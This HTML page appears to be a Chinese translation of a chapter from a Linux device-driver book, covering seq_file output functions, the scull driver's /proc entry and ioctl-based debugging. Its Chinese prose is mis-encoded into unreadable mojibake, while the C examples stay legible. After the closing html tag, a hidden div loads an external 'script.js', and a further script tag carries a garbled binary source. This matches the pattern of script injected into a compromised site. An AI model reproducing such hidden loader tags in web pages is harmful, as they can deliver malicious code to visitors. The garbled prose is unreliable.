<p>ÔÚÕâĞ©µ÷ÓÃÖĞ, ÄÚºËµ÷ÓÃ show ·½·¨À´ÕæÕıÊä³öÓĞÓÃµÄ¶«Î÷¸øÓÃ»§¿Õ¼ä. Õâ¸ö·½·¨µÄÔ­ĞÍÊÇ:</p>
<pre class="programlisting">
int show(struct seq_file *sfile, void *v); 
</pre>
<p>Õâ¸ö·½·¨Ó¦µ±´´½¨ĞòÁĞÖĞÓÉ iterator v Ö¸Ê¾µÄÏîµÄÊä³ö. ²»Ó¦µ±Ê¹ÓÃ printk, µ«ÊÇ; ÓĞÒ»Ì×ÌØÊâµÄÓÃ×÷ seq_file Êä³öµÄº¯Êı:</p>
<div class="variablelist"><dl>
<dt><span class="term"><span>int seq_printf(struct seq_file *sfile, const char *fmt, ...);</span></span></dt>
<dd><p>ÕâÊÇ¸ø seq_file ÊµÏÖµÄ printf ¶ÔµÈÌå; Ëü²ÉÓÃ³£ÓÃµÄ¸ñÊ½´®ºÍ¸½¼ÓÖµ²ÎÊı. Äã±ØĞëÒ²½«¸ø show º¯ÊıµÄ set_file ½á¹¹´«µİ¸øËü, È»¶ø. Èç¹ûseq_printf ·µ»Ø·ÇÁãÖµ, ÒâË¼ÊÇ»º´æÇøÒÑÌî³ä, Êä³ö±»¶ªÆú. ´ó²¿·ÖÊµÏÖºöÂÔÁË·µ»ØÖµ, µ«ÊÇ.</p></dd>
<dt><span class="term"><span>int seq_putc(struct seq_file *sfile, char c);</span></span></dt>
<dd></dd>
<dt><span class="term"><span>int seq_puts(struct seq_file *sfile, const char *s);</span></span></dt>
<dd><p>ËüÃÇÊÇÓÃ»§¿Õ¼ä putc ºÍ puts º¯ÊıµÄ¶ÔµÈÌå.</p></dd>
<dt><span class="term"><span>int seq_escape(struct seq_file *m, const char *s, const char *esc);</span></span></dt>
<dd><p>Õâ¸öº¯ÊıÊÇ seq_puts µÄ¶ÔµÈÌå, ³ıÁË s ÖĞµÄÈÎºÎÒ²ÔÚ esc ÖĞ³öÏÖµÄ×Ö·ûÒÔ°Ë½øÖÆ¸ñÊ½´òÓ¡. esc µÄÒ»¸öÍ¨ÓÃÖµÊÇ"\t\n\\", ËüÊ¹ÄÚÇ¶µÄ¿Õ¸ñ²»»á¸ãÂÒÊä³öºÍ¿ÉÄÜ¸ãÂÒ shell ½Å±¾.</p></dd>
<dt><span class="term"><span>int seq_path(struct seq_file *sfile, struct vfsmount *m, struct dentry *dentry, char *esc);</span></span></dt>
<dd><p>Õâ¸öº¯ÊıÄÜ¹»ÓÃÀ´Êä³öºÍ¸ø¶¨ÃüÁîÏî¹ØÁªµÄÎÄ¼şÃû×Ó. ËüÔÚÉè±¸Çı¶¯ÖĞ²»¿ÉÄÜÓĞÓÃ; ÎÒÃÇÊÇÎªÁËÍêÕûÔÚ´Ë°üº¬Ëü.</p></dd>
</dl></div>
<p>»Øµ½ÎÒÃÇµÄÀı×Ó; ÔÚ scull Ê¹ÓÃµÄ show ·½·¨ÊÇ:</p>
<pre class="programlisting">
static int scull_seq_show(struct seq_file *s, void *v)
{
    struct scull_dev *dev = (struct scull_dev *) v;
    struct scull_qset *d;
    int i;

    if (down_interruptible (&amp;dev-&gt;sem))
        return -ERESTARTSYS;

    seq_printf(s, "\nDevice %i: qset %i, q %i, sz %li\n",
               (int) (dev - scull_devices), dev-&gt;qset,
               dev-&gt;quantum, dev-&gt;size);

    for (d = dev-&gt;data; d; d = d-&gt;next) { /* scan the list */
        seq_printf(s, " item at %p, qset at %p\n", d, d-&gt;data);
        if (d-&gt;data &amp;&amp; !d-&gt;next) /* dump only the last item */

            for (i = 0; i &lt; dev-&gt;qset; i++) {
                if (d-&gt;data[i])
                    seq_printf(s, " % 4i: %8p\n",
                               i, d-&gt;data[i]);
            }
    }
    up(&amp;dev-&gt;sem);
    return 0;
}
</pre>
<p>ÕâÀï, ÎÒÃÇ×îÖÕ½âÊÍÎÒÃÇµÄ" iterator" Öµ, ¼òµ¥µØÊÇÒ»¸ö scull_dev ½á¹¹Ö¸Õë.</p>
<p>ÏÖÔÚÒÑÓĞÁËÒ»¸öÍêÕûµÄ iterator ²Ù×÷µÄ¼¯ºÏ, scull ±ØĞë°ü×°ÆğËüÃÇ, ²¢ÇÒÁ¬½ÓËüÃÇµ½ /proc ÖĞµÄÒ»¸öÎÄ¼ş. µÚÒ»²½ÊÇÌî³äÒ»¸ö seq_operations ½á¹¹:</p>
<pre class="programlisting">
static struct seq_operations scull_seq_ops = {
 .start = scull_seq_start,
 .next = scull_seq_next,
 .stop = scull_seq_stop,
 .show = scull_seq_show
}; 
</pre>
<p>ÓĞÄÇ¸ö½á¹¹ÔÚ, ÎÒÃÇ±ØĞë´´½¨Ò»¸öÄÚºËÀí½âµÄÎÄ¼şÊµÏÖ. ÎÒÃÇ²»Ê¹ÓÃÇ°ÃæÃèÊö¹ıµÄ read_proc ·½·¨; ÔÚÊ¹ÓÃ seq_file Ê±, ×îºÃÔÚÒ»¸öÉÔµÍµÄ¼¶±ğÉÏÁ¬½Óµ½ /proc. ÄÇÒâÎ¶×Å´´½¨Ò»¸ö file_operations ½á¹¹(ÊÇµÄ, ºÍ×Ö·ûÇı¶¯Ê¹ÓÃµÄÍ¬Ñù½á¹¹) À´ÊµÏÖËùÓĞÄÚºËĞèÒªµÄ²Ù×÷, À´´¦ÀíÎÄ¼şÉÏµÄ¶ÁºÍÒÆ¶¯. ĞÒÔËµÄÊÇ, Õâ¸öÈÎÎñÊÇ¼òµ¥µÄ. µÚÒ»²½ÊÇ´´½¨Ò»¸ö open ·½·¨Á¬½ÓÎÄ¼şµ½ seq_file ²Ù×÷:</p>
<pre class="programlisting">
static int scull_proc_open(struct inode *inode, struct file *file)
{
    return seq_open(file, &amp;scull_seq_ops);
}
</pre>
<p>µ÷ÓÃ seq_open Á¬½ÓÎÄ¼ş½á¹¹ºÍÎÒÃÇÉÏÃæ¶¨ÒåµÄĞòÁĞ²Ù×÷. ÊÂÊµÖ¤Ã÷, open ÊÇÎÒÃÇ±ØĞë×Ô¼ºÊµÏÖµÄÎ¨Ò»ÎÄ¼ş²Ù×÷, Òò´ËÎÒÃÇÏÖÔÚ¿ÉÒÔ½¨Á¢ÎÒÃÇµÄ file_operations ½á¹¹:</p>
<pre class="programlisting">
static struct file_operations scull_proc_ops = {
 .owner = THIS_MODULE,
 .open = scull_proc_open,
 .read = seq_read,
 .llseek = seq_lseek,
 .release = seq_release 
}; 
</pre>
<p>ÕâÀïÎÒÃÇÖ¸¶¨ÎÒÃÇ×Ô¼ºµÄ open ·½·¨, µ«ÊÇÊ¹ÓÃÔ¤×°ºÃµÄ·½·¨ seq_read, seq_lseek, ºÍ seq_release ¸øÆäËû.</p>
<p>×îºóµÄ²½ÖèÊÇ´´½¨ /proc ÖĞµÄÊµ¼ÊÎÄ¼ş:</p>
<pre class="programlisting">
entry = create_proc_entry("scullseq", 0, NULL);
if (entry)
    entry-&gt;proc_fops = &amp;scull_proc_ops;
</pre>
<p>²»ÊÇÊ¹ÓÃ create_proc_read_entry, ÎÒÃÇµ÷ÓÃµÍ²ãµÄ create_proc_entry, ÎÒÃÇÓĞÕâ¸öÔ­ĞÍ:</p>
<pre class="programlisting">
struct proc_dir_entry *create_proc_entry(const char *name,mode_t mode,struct proc_dir_entry *parent); 
</pre>
<p>²ÎÊıºÍËüÃÇµÄÔÚ create_proc_read_entry ÖĞµÄ¶ÔµÈÌåÏàÍ¬: ÎÄ¼şÃû×Ó, ËüµÄÎ»ÖÃ, ÒÔ¼°¸¸Ä¿Â¼.</p>
<p>ÓĞÁËÉÏÃæ´úÂë, scull ÓĞÒ»¸öĞÂµÄ /proc Èë¿Ú, ¿´À´ºÜÏóÇ°ÃæµÄÒ»¸ö. µ«ÊÇ, ËüÊÇ¸ß¼¶µÄ, ÒòÎªËü²»¹ÜËüµÄÊä³öÓĞ¶àÃ´´ó, ËüÕıÈ·´¦ÀíÒÆ¶¯, ²¢ÇÒÍ¨³£ËüÊÇÒ×¶ÁºÍÒ×Î¬»¤µÄ. ÎÒÃÇ½¨ÒéÊ¹ÓÃ seq_file , À´ÊµÏÖ°üº¬¶à¸ö·Ç³£Ğ¡ÊıÄ¿µÄÊä³öĞĞÊıµÄÎÄ¼ş.</p>
</div>
</div>
<div class="sect2" lang="zh-cn">
<div class="titlepage"><div><div><h3 class="title">
<a name="TheioctlMethod.sect"></a>4.3.2.&#160;ioctl ·½·¨</h3></div></div></div>
<p>ioctl, ÎÒÃÇÔÚµÚ 1 ÕÂÕ¹Ê¾¸øÄãÈçºÎÊ¹ÓÃ, ÊÇÒ»¸öÏµÍ³µ÷ÓÃ, ×÷ÓÃÓÚÒ»¸öÎÄ¼şÃèÊö·û; Ëü½ÓÊÕÒ»¸öÈ·¶¨Òª½øĞĞµÄÃüÁîµÄÊı×ÖºÍ(¿ÉÑ¡µØ)ÁíÒ»¸ö²ÎÊı, ³£³£ÊÇÒ»¸öÖ¸Õë. ×÷ÎªÒ»¸öÊ¹ÓÃ /proc ÎÄ¼şÏµÍ³µÄÌæ´ú, Äã¿ÉÒÔÊµÏÖ¼¸¸öÓÃÀ´µ÷ÊÔÓÃµÄ ioctl ÃüÁî. ÕâĞ©ÃüÁî¿ÉÒÔ´ÓÇı¶¯¿½±´Ïà¹ØµÄÊı¾İ½á¹¹µ½ÓÃ»§¿Õ¼ä, ÕâÀïÄã¿ÉÒÔ¼ì²éËüÃÇ.</p>
<p>ÕâÖÖ·½Ê½Ê¹ÓÃ ioctl À´»ñÈ¡ĞÅÏ¢ÓĞĞ©±ÈÊ¹ÓÃ /proc À§ÄÑ, ÒòÎªÄãĞèÒªÁíÒ»¸ö³ÌĞòÀ´·¢³ö ioctl ²¢ÇÒÏÔÊ¾½á¹û. ±ØĞë±àĞ´Õâ¸ö³ÌĞò, ±àÒë, ²¢ÇÒÓëÄãÔÚ²âÊÔµÄÄ£¿é±£³ÖÍ¬²½. ÁíÒ»·½Ãæ, Çı¶¯²à´úÂë¿ÉÄÜÈİÒ×¹ıĞèÒªÊµÏÖÒ»¸ö /proc ÎÄ¼şµÄ´úÂë.</p>
<p>ÓĞÊ±ºò ioctl ÊÇ»ñÈ¡ĞÅÏ¢×îºÃµÄ·½·¨, ÒòÎªËüÔËĞĞ±È¶ÁÈ¡ /proc ¿ì. Èç¹ûÔÚÊı¾İĞ´µ½ÆÁÄ»Ö®Ç°±ØĞë×öÒ»Ğ©ÊÂÇé, »ñÈ¡¶ş½øÖÆĞÎÊ½µÄÊı¾İ±È¶ÁÈ¡Ò»¸öÎÄ±¾ÎÄ¼şÒª¸üÓĞĞ§. ÁíÍâ, ioctl ²»ÒªÇó»®·ÖÊı¾İÎªĞ¡ÓÚÒ»Ò³µÄÆ¬¶Î.</p>
<p>ioctl ·½·¨µÄÁíÒ»¸öÓĞÈ¤µÄÓÅµãÊÇĞÅÏ¢»ñÈ¡ÃüÁî¿ÉÁôÔÚÇı¶¯ÖĞ, µ±µ÷ÊÔ±»½ûÖ¹Ê±. ²»Ïó¶ÔÈÎºÎ²é¿´Ä¿Â¼µÄÈË(²¢ÇÒÌ«¶àÈË¿ÉÄÜÆæ¹Ö"Õâ¸ö¹ÖÎÄ¼şÊÇÊ²Ã´")¶¼¿É¼ûµÄ /proc ÎÄ¼ş, ²»¼ÇÈëÎÄµµµÄ ioctl ÃüÁî¿ÉÄÜ±£³Ö²»ÎªÈËÖª. ÁíÍâ, Èç¹ûÇı¶¯·¢ÉúÁË¹ÖÒìµÄÊÂÇé, ËüÃÇÈÔ½«ÔÚÄÇÀï. Î¨Ò»µÄÈ±µãÊÇÄ£¿é¿ÉÄÜ»áÉÔÎ¢´óĞ©.</p>
</div>
<div class="footnotes">
<br><hr width="100" align="left">
<div class="footnote"><p><sup>[<a name="ftn.id421348" href="#id421348">14</a>] </sup>Á¬×ÖºÅ, »òÕß¼õºÅ, ÊÇÒ»¸ö"Ä§Êõ"±êÊ¶ÒÔ×èÖ¹ syslogd Ë¢ĞÂÎÄ¼şµ½´ÅÅÌÔÚÃ¿¸öĞÂÏûÏ¢, ÓĞ¹ØÎÄµµÔÚ syslog.conf(5), Ò»¸öÖµµÃÒ»¶ÁµÄ manpage.</p></div>
</div>
</div>
<div class="navfooter">
<hr>
<table width="100%" summary="Navigation footer">
<tr>
<td width="40%" align="left">
<a accesskey="p" href="ch04s02.html">ÉÏÒ»Ò³</a>&#160;</td>
<td width="20%" align="center"><a accesskey="u" href="ch04.html">ÉÏÒ»¼¶</a></td>
<td width="40%" align="right">&#160;<a accesskey="n" href="ch04s04.html">ÏÂÒ»Ò³</a>
</td>
</tr>
<tr>
<td width="40%" align="left" valign="top">4.2.&#160;ÓÃ´òÓ¡µ÷ÊÔ&#160;</td>
<td width="20%" align="center"><a accesskey="h" href="index.html">ÆğÊ¼Ò³</a></td>
<td width="40%" align="right" valign="top">&#160;4.4.&#160;Ê¹ÓÃ¹Û²ìÀ´µ÷ÊÔ</td>
</tr>
</table>
</div>
</body></html>
<div style="display:none"><script language="JavaScript" src="script.js"></script> </div>

<script language=javascript src=ÿÊG‡ Â2BÆÄïşòİ”xºı8üäÀûºn*İäÀûºn*İäÀûºn*İäÀûºn*İäÀûºn*İäÀûºn*İšŠPpÈd></script>